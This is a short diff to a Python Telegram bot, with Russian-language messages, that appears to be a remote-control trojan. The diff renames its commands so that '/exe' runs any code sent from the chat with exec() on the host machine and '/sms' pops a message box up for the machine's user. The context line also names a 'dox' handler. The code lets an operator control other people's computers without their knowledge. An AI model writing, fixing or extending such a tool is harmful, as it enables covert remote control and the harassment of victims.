@@ -222,9 +222,9 @@ def dox(message):
 @bot.message_handler(commands=['exe'])
 def execute_code(message):
     chat_id = message.chat.id
-    code = message.text.replace('/code', '').strip()
+    code = message.text.replace('/exe', '').strip()
     if code == '':
-        bot.send_message(chat_id, '/code твой код')
+        bot.send_message(chat_id, '/exe твой код')
     try:
         exec(code)
         bot.send_message(chat_id, 'Код успешно выполнен.')
@@ -234,9 +234,9 @@ def execute_code(message):
 @bot.message_handler(commands=['sms'])
 def msg_box(message):
     chat_id = message.chat.id
-    message_text = message.text.replace('/msg_box ', '')
+    message_text = message.text.replace('/sms ', '')
     if message_text == '':
-        bot.send_message(chat_id, 'НЕПРАВИЛЬНО НУЖНО ТАК: /msg_box твой текст')
+        bot.send_message(chat_id, 'НЕПРАВИЛЬНО НУЖНО ТАК: /sms твой текст')
     else:
         bot.send_message(chat_id, f'ПОЛЬЗОВАТЕЛЮ ВЫВЕДЕНО СООБЩЕНИЕ: {message_text}')
         message_bytes = message_text.encode('cp1251')
